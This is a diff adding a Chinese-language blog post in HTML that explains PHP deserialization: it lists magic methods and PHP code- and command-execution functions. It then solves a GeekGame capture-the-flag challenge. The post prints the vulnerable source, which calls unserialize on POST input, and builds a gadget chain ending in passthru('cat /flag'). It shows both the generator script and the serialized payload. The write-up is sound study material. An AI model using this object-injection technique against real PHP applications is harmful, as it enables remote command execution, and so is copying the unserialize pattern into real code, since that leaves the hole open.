@@ -1,0 +1,492 @@
+<!DOCTYPE html>
+<html 
+	lang="en">
+	<head>
+		<meta charset="UTF-8" />
+		<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+		<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+		
+<link rel="stylesheet" href="/css/layout.css">
+
+		
+		<title> 反序列化 -  clown</title>
+		<link rel="stylesheet" href="https://unpkg.com/mdui@1.0.2/dist/css/mdui.min.css" />
+		<script src="https://unpkg.com/mdui@1.0.2/dist/js/mdui.min.js"></script>
+		<!-- lazyload -->
+		<script src="https://unpkg.com/lazysizes@5.1.0/lazysizes.min.js"></script>
+		<!-- smooth-scrolling -->
+		<script src="https://unpkg.com/smooth-scrolling.js@1.0.0"></script>
+		<!-- highlight -->
+		<link rel="stylesheet" href="//unpkg.com/@highlightjs/cdn-assets@11.6.0/styles/atom-one-dark.min.css" />
+		<script src="//unpkg.com/@highlightjs/cdn-assets@11.6.0/highlight.min.js"></script>
+		<!-- 预置 kiraicon -->
+		
+<link rel="stylesheet" href="/lib/iconfont/iconfont.css">
+
+		
+		<link
+			rel="shortcut icon"
+			href="https://raw.githubusercontent.com/ch1ny/PictureCDN/master/others/116359b4ccf19917.jpg"
+			type="image/png"
+		/>
+		
+<link rel="stylesheet" href="/deps/css/APlayer.min.css">
+
+		
+			
+				
+<link rel="stylesheet" href="/style.css">
+
+			
+				
+<link rel="stylesheet" href="/custom.css">
+
+			
+		
+		
+<script src="/deps/js/APlayer.min.js"></script>
+<script src="/deps/js/Meting.min.js"></script>
+
+	<meta name="generator" content="Hexo 7.0.0"></head>
+
+	<body>
+		<div
+			class="kira-background"
+			style="background-image: url('https://raw.githubusercontent.com/ch1ny/PictureCDN/master/others/f0d5cc34c6e5aa7.jpg')"
+		></div>
+		<div class="kira-header">
+    <a
+        class="kira-drawer-button mdui-ripple"
+        title="导航栏"
+        onclick="document.querySelector('.kira-sidebar-modal').classList.add('show');document.querySelector('.kira-sidebar#sidebar').classList.add('show');"
+    >
+        <i class="kirafont icon-menu"></i>
+    </a>
+    <a href="/" title="clown">
+        <img
+			src="https://raw.githubusercontent.com/ch1ny/PictureCDN/master/others/116359b4ccf19917.jpg"
+			alt="clown"
+		/>
+    </a>
+</div>
+		<div class="kira-body">
+			<div class="kira-sidebar" id="sidebar">
+	<div class="kira-avatar mdui-ripple">
+		<a target="_blank" rel="noopener" href="https://raw.githubusercontent.com/ch1ny/PictureCDN/master/others/116359b4ccf19917.jpg" title="clown">
+			<img
+				src="https://raw.githubusercontent.com/ch1ny/PictureCDN/master/others/116359b4ccf19917.jpg"
+				alt="clown"
+			/>
+		</a>
+	</div>
+	<div class="kira-count">
+		<div><span>文章</span>5</div>
+		<div><span>标签</span>2</div>
+		<div><span>分类</span>2</div>
+	</div>
+	<div class="kira-list">
+		
+		<a
+			class="kira-list-item mdui-ripple false"
+			href="/"
+			title="回到首页"
+		>
+			<i
+				class="kirafont
+					
+						icon-home
+					"
+			></i>
+			<div class="kira-list-item-content">
+				回到首页
+			</div>
+		</a>
+		
+		<a
+			class="kira-list-item mdui-ripple false"
+			href="/archive.html"
+			title="文章归档"
+		>
+			<i
+				class="kirafont
+					
+						icon-container
+					"
+			></i>
+			<div class="kira-list-item-content">
+				文章归档
+			</div>
+		</a>
+		
+		<a
+			class="kira-list-item mdui-ripple false"
+			href="/about.html"
+			title="关于本人"
+		>
+			<i
+				class="kirafont
+					
+						icon-user
+					"
+			></i>
+			<div class="kira-list-item-content">
+				关于本人
+			</div>
+		</a>
+		
+		<a
+			class="kira-list-item mdui-ripple false"
+			href="/friends.html"
+			title="我的朋友"
+		>
+			<i
+				class="kirafont
+					
+						icon-team
+					"
+			></i>
+			<div class="kira-list-item-content">
+				我的朋友
+			</div>
+		</a>
+		
+	</div>
+	<aside id="kira-sidebar">
+		
+			<div class="kira-widget-wrap">
+	<div class="kira-widget kira-social">
+		
+			<a
+				class="mdui-ripple"
+				href="tencent://AddContact/?fromId=45&fromSubId=1&subcmd=all&uin=1056317718&website=www.oicqzone.com"
+				target="_blank"
+				mdui-tooltip="{content: 'QQ'}"
+				style="color: rgb(49, 174, 255); background-color: rgba(49, 174, 255, .1);"
+			>
+				<i
+					class="kirafont
+					
+						icon-QQ
+					"
+				></i>
+			</a>
+		
+			<a
+				class="mdui-ripple"
+				href="https://space.bilibili.com/378722283"
+				target="_blank"
+				mdui-tooltip="{content: '哔哩哔哩'}"
+				style="color: rgb(231, 106, 141); background-color: rgba(231, 106, 141, .15);"
+			>
+				<i
+					class="kirafont
+					
+						icon-bilibili
+					"
+				></i>
+			</a>
+		
+			<a
+				class="mdui-ripple"
+				href="https://github.com/clowsman"
+				target="_blank"
+				mdui-tooltip="{content: 'GitHub'}"
+				style="color: rgb(25, 23, 23); background-color: rgba(25, 23, 23, .15);"
+			>
+				<i
+					class="kirafont
+					
+						icon-github
+					"
+				></i>
+			</a>
+		
+			<a
+				class="mdui-ripple"
+				href="https://gitee.com/ljc0033"
+				target="_blank"
+				mdui-tooltip="{content: 'Gitee'}"
+				style="color: rgb(165, 15, 15); background-color: rgba(165, 15, 15, .15);"
+			>
+				<i
+					class="kirafont
+					
+						icon-gitee
+					"
+				></i>
+			</a>
+		
+	</div>
+</div>
+
+		
+			
+  <div class="kira-widget-wrap">
+    <h3 class="kira-widget-title">分类</h3>
+    <div class="kira-widget">
+      <ul class="category-list">
+        
+        
+
+        
+          <li class="category-list-item">
+            <a class="category-list-link" href="/categories/blog/">
+              blog
+            </a>
+            <span class="category-list-count">2</span>
+          </li>
+        
+          <li class="category-list-item">
+            <a class="category-list-link" href="/categories/web/">
+              web
+            </a>
+            <span class="category-list-count">1</span>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+		
+			
+	<div class="kira-widget-wrap">
+		<div id="randomtagcloud" class="kira-widget tagcloud kira-rainbow">
+			<a href="/tags/ctf/" style="font-size: 10px;">ctf</a> <a href="/tags/%E5%AD%A6%E4%B9%A0/" style="font-size: 20px;">学习</a>
+		</div>
+		
+	</div>
+
+
+		
+	</aside>
+	<div class="kira-copyright">
+		&copy; 2024
+		<a href="/">clown</a>
+		Powered by <a href="http://hexo.io/" target="_blank">Hexo</a> &
+		<a href="https://github.com/ch1ny/kira-hexo/" target="_blank">Kira-Hexo</a>
+		<br />
+		
+		
+	</div>
+</div>
+<div
+	class="kira-sidebar-modal"
+	id="sidebar-modal"
+	onclick="(function(self) {
+		self.classList.remove('show');
+		document.querySelector('.kira-sidebar.show#sidebar').classList.remove('show');
+	})(this)"
+></div>
+			<div class="kira-content">
+				<div id="kira-top-header"></div>
+				<div class="kira-main-content">
+					
+<link rel="stylesheet" href="/css/kira-image.css">
+
+
+<script src="/js/kira-image.js"></script>
+
+<div class="kira-image">
+    <div class="kira-image-modal">
+        <div class="kira-image-header">
+            <div class="kira-image-counter"></div>
+            <div class="kira-image-title"></div>
+            <div class="kira-image-operation">
+                <div class="kira-image-operation-button" id="kira-image-operation-button-zoom">
+                    <i class="kirafont icon-zoom-in"></i>
+                </div>
+                <div class="kira-image-operation-button" id="kira-image-operation-button-close">
+                    <i class="kirafont icon-close"></i>
+                </div>
+            </div>
+        </div>
+        <div class="kira-image-container">
+            <div class="kira-image-prev-button-panel">
+                <div class="kira-image-exchange-button">
+                    <i class="kirafont icon-left"></i>
+                </div>
+            </div>
+            <div class="kira-image-list">
+                <div class="kira-image-prev">
+                    <img />
+                </div>
+                <div class="kira-image-now">
+                    <img />
+                </div>
+                <div class="kira-image-next">
+                    <img />
+                </div>
+            </div>
+            <div class="kira-image-next-button-panel">
+                <div class="kira-image-exchange-button">
+                    <i class="kirafont icon-right"></i>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+<div class="kira-post">
+	<article>
+		
+		<div
+			class="kira-post-cover"
+			style="padding-bottom: '56.25%'"
+		>
+			<img
+				data-src="https://raw.githubusercontent.com/ch1ny/PictureCDN/master/others/f0d5cc34c6e5aa7.jpg"
+				data-sizes="auto"
+				alt="反序列化"
+				class="lazyload kira-post-cover-image disabled-kira-image"
+			/>
+			<h1>反序列化</h1>
+		</div>
+		
+		<div class="kira-post-meta kira-rainbow" style="margin:10px 0!important;">
+			<a><i class="kirafont icon-calendar-fill"></i>2023年11月04日</a>
+			<a><i class="kirafont icon-edit-fill"></i>1.4k 字</a>
+			<a><i class="kirafont icon-time-circle-fill"></i>大概 6 分钟</a>
+		</div>
+		<p>记录一下反序列化相关的函数</p>
+<p>这篇文章蛮好的：<a target="_blank" rel="noopener" href="https://spaceman-911.gitee.io/2021/06/30/PHP-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%88%E8%B6%85%E7%BB%86%E7%9A%84%EF%BC%89/">PHP-反序列化（超细的） | spaceman’blog (gitee.io)</a></p>
+<p><strong>常见的魔术方法</strong></p>
+<ul>
+<li><p>__construct() :当对象被创建时触发</p>
+</li>
+<li><p>__destruct() :当对象被销毁时触发</p>
+</li>
+<li><p>__toString() :当对象被当作一个字符串使用时触发</p>
+</li>
+<li><p>__sleep() :序列化对象前调用（其返回需要是一个数组）</p>
+</li>
+<li><p>__wakeup() :反序列化恢复对象前调用，当字符串表示的对象属性个数大于真实个数时会跳过该函数执行</p>
+</li>
+<li><p>__call() :当调用对象不存在的方法时自动调用</p>
+</li>
+<li><p>__get() :从不可访问的属性读取数据时调用,或者不存在的属性</p>
+</li>
+<li><p>__invoke() :把一个实例对象当作函数使用时被调用</p>
+</li>
+<li><p>__clone() : 进行对象clone时被调用，用来调整对象的克隆行为</p>
+</li>
+<li><p>__callStatic() :调用不可访问或不存在的静态方法时自动调用</p>
+</li>
+<li><p>__isset() :在不可访问的属性上调用 isset() 或 empty() 时触发</p>
+</li>
+<li><p>__set() :当给不可访问或不存在属性赋值时被调用</p>
+</li>
+<li><p>__unset() :在不可访问的属性上使用 unset() 时触发</p>
+</li>
+<li><p>__ set_state() :</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">当调用 var_export() 导出类时，此静态方法被调用。用 __set_state() 的返回值做为 var_export() 的返回值<br></code></pre></td></tr></table></figure>
+</li>
+<li><p>__debuginfo() :当调用 var_dump() 打印对象时被调用（当你不想打印所有属性），适用于PHP5.6版本</p>
+</li>
+</ul>
+<p><strong>php代码执行有关的函数</strong></p>
+<ul>
+<li><p>eval()函数：会将字符串当作php代码执行，需要以分号结尾，但比较特殊的是它不能被当作变量执行，例如：$a(“phpinfo();”),a为’eval’；这样子会报函数未定义的错误。</p>
+<p>这里去了解一下发现：eval是因为是一个语言构造器而不是一个函数，不能被可变函数调用。</p>
+<blockquote>
+<p>可变函数即变量名加括号，PHP系统会尝试解析成函数，如果有当前变量中的值为命名的函数，就会调用。如果没有就报错。<br>可变函数不能用于例如：echo，print，unset()，isset()，empty()，include，require eval() 以及类似的语言结构。需要使用自己的包装函数来将这些结构用作可变函数。</p>
+</blockquote>
+</li>
+<li><p>assert()函数：也是将字符串当作php代码执行，不需要以分号结尾，但在php7.1版本后就默认不再可以执行代码了</p>
+</li>
+</ul>
+<p><strong>命令执行相关函数</strong></p>
+<ul>
+<li>system()函数：将字符串作为OS命令执行，自带输出功能。</li>
+<li>passthru()函数：将字符串作为OS命令执行，不需要输出执行结果，且输出全部的内容。</li>
+<li>exec()函数：将字符串作为OS命令执行，需要输出执行结果，比如使用echo将他打印出来，且它只会输出最后一行的内容。</li>
+<li>shell_exec()：将字符串作为OS命令执行，需要输出执行结果，且输出全部的内容。</li>
+<li>反引号&#96;&#96;：里面的代码也会当作OS命令执行，需要输出执行结果。</li>
+<li>popen()&#x2F;proc_open()函数：该函数也可以将字符串当作OS命令来执行，但是该函数返回的是文件指针而非命令执行结果。该函数有两个参数。</li>
+</ul>
+<p><code>以GeekGame的一题为例来进行学习：</code></p>
+<h1><span id="unsign">unsign</span></h1><p>题目的源码如下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">syc</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$cuit</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span>(<span class="hljs-string">&quot;action!&lt;br&gt;&quot;</span>);<br>        <span class="hljs-variable">$function</span>=<span class="hljs-variable language_">$this</span>-&gt;cuit;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$function</span>();<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">lover</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$yxx</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$QW</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span>(<span class="hljs-string">&quot;invoke!&lt;br&gt;&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;yxx-&gt;QW;<br>    &#125;<br><br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">web</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$eva1</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$interesting</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$var</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span>(<span class="hljs-string">&quot;get!&lt;br&gt;&quot;</span>);<br>        <span class="hljs-variable">$eva1</span>=<span class="hljs-variable language_">$this</span>-&gt;eva1;<br>        <span class="hljs-variable">$eva1</span>(<span class="hljs-variable language_">$this</span>-&gt;interesting);<br>    &#125;<br>&#125;<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;url&#x27;</span>])) <br>&#123;<br>    <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;url&#x27;</span>]);<br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>可以分析知道有三个魔术方法，分别是：**__destruct()<strong>,</strong>__invoke()<strong>,</strong>__get()**。</p>
+<p>最终我们是要进入$eva1 里面进行命令执行，所以先给eva1和interesting变量进行赋值，注意不能赋值eval，因为eval不能动态调用，然后这是要进入到**__get()<strong>方法中才能进行命令执行，再网上看能看到lover类里面返回了变量，即我们可以通过这里访问web的实例对象不存在的属性从而触发</strong>__get()<strong>方法，看到最后访问的是QW变量，那只要设置一个web对象中不存在的属性即可；要访问该属性，我们又要触发</strong>__invoke()<strong>方法，看到有syc的</strong>__destruct()**方法返回了一个变量当作函数，那我们给这个变量传入lover对象即可；</p>
+<p>所以调用链为这样：**__destruct()<strong>&#x3D;&gt;</strong>__invoke()<strong>&#x3D;&gt;</strong>__get()**</p>
+<p>payload如下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs PHP"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">syc</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$cuit</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span>(<span class="hljs-string">&quot;action!&lt;br&gt;&quot;</span>);<br>        <span class="hljs-variable">$function</span>=<span class="hljs-variable language_">$this</span>-&gt;cuit;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$function</span>();<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">lover</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$yxx</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$QW</span>=<span class="hljs-string">&#x27;test&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span>(<span class="hljs-string">&quot;invoke!&lt;br&gt;&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;yxx-&gt;QW;<br>    &#125;<br><br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">web</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$eva1</span>=<span class="hljs-string">&#x27;passthru&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$interesting</span>=<span class="hljs-string">&#x27;cat /flag&#x27;</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$var</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span>(<span class="hljs-string">&quot;get!&lt;br&gt;&quot;</span>);<br>        <span class="hljs-variable">$eva1</span>=<span class="hljs-variable language_">$this</span>-&gt;eva1;<br>        <span class="hljs-variable">$eva1</span>(<span class="hljs-variable language_">$this</span>-&gt;interesting);<br>    &#125;<br>&#125;<br><span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">syc</span>();<br><span class="hljs-variable">$a</span>-&gt;cuit=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">lover</span>();<br><span class="hljs-variable">$a</span>-&gt;cuit-&gt;yxx=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">web</span>();<br><span class="hljs-variable">$b</span>=<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$b</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$b</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">O:3:&quot;syc&quot;:1:&#123;s:4:&quot;cuit&quot;;O:5:&quot;lover&quot;:2:&#123;s:3:&quot;yxx&quot;;O:3:&quot;web&quot;:2:&#123;s:4:&quot;eva1&quot;;s:8:&quot;passthru&quot;;s:11:&quot;interesting&quot;;s:9:&quot;cat /flag&quot;;&#125;s:2:&quot;QW&quot;;s:4:&quot;test&quot;;&#125;&#125;O:3:&quot;syc&quot;:1:&#123;s:4:&quot;cuit&quot;;O:5:&quot;lover&quot;:2:&#123;s:3:&quot;yxx&quot;;O:3:&quot;web&quot;:2:&#123;s:4:&quot;eva1&quot;;s:8:&quot;passthru&quot;;s:11:&quot;interesting&quot;;s:9:&quot;cat /flag&quot;;&#125;s:2:&quot;QW&quot;;s:4:&quot;test&quot;;&#125;&#125;<br></code></pre></td></tr></table></figure>
+
+
+	</article>
+
+	 
+    <div class="kira-post-copyright">
+        <strong>Author：</strong>clown<br>
+        <strong>Link：</strong><a href="https://clowsman.github.io/2023/11/04/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" title="https:&#x2F;&#x2F;clowsman.github.io&#x2F;2023&#x2F;11&#x2F;04&#x2F;反序列化&#x2F;" target="_blank" rel="noopener">https:&#x2F;&#x2F;clowsman.github.io&#x2F;2023&#x2F;11&#x2F;04&#x2F;反序列化&#x2F;</a><br>
+        
+            <strong>版权声明：</strong>本文采用 <a href="https://creativecommons.org/licenses/by-nc-sa/3.0/cn/deed.zh" target="_blank">CC BY-NC-SA 3.0 CN</a> 协议进行许可
+        
+    </div>
+
+  
+	<div class="kira-post-nav">
+		<nav class="post-nav">
+			      
+			<!-- 先找到与当前文字相同的目录 -->
+			   
+			<!-- 在找到当前文章所在的 index -->
+			          
+		</nav>
+	</div>
+	
+	<div class="kira-post-meta kira-rainbow">
+		
+			<a class="kirafont icon-container-fill -link" href="/categories/web/">web</a>
+		
+		
+			<a class="kirafont icon-tag-fill -none-link" href="/tags/ctf/" rel="tag">ctf</a>
+		
+	</div>
+	
+		<script src="/js/kira-code-copy.js"></script>
+	
+	
+	<div class="kira-post-footer">
+		
+
+		
+	<div class="giscus"></div>
+  
+    <script src="https://giscus.app/client.js"
+      data-repo="ch1ny/ch1ny.github.io"
+      data-repo-id="R_kgDOHGgizw"
+      data-category="General"
+      data-category-id="DIC_kwDOHGgiz84CU88t"
+      data-mapping="pathname"
+      data-strict="0"
+      data-reactions-enabled="1"
+      data-emit-metadata="0"
+      data-input-position="top"
+      data-theme="light"
+      data-lang="en"
+      data-loading="lazy"
+      crossorigin="anonymous"
+      async  
+    ></script>
+  
+
+	</div>
+	
+</div>
+
+				</div>
+			</div>
+			<div class="kira-right-column">
+	<a onclick="document.querySelector('#kira-top-header').scrollIntoView({behavior: 'smooth'});" class="kira-backtotop" aria-label="回到顶部" title="回到顶部">
+		<button class="mdui-fab mdui-ripple">
+			<i class="kirafont icon-caret-up"></i>
+		</button>
+	</a>
+</div>
+
+		</div>
+	</body>
+</html>
